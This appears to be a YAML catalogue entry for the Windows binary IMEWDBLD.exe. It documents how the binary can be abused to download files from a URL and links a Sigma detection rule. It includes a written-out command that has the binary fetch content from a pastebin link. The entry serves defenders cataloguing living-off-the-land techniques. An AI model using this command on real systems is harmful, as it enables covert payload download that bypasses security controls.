---
Name: IMEWDBLD.exe
Description: Microsoft IME Open Extended Dictionary Module
Author: 'Wade Hickey'
Created: '2020-03-05'
Commands:
  - Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
    Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>
    Usecase: Download file from Internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
Detection:
Resources:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/network_connection/net_connection_win_imewdbld.yml
  - Link: https://twitter.com/notwhickey/status/1367493406835040265
Acknowledgement:
  - Person: Wade Hickey
    Handle: '@notwhickey'
---
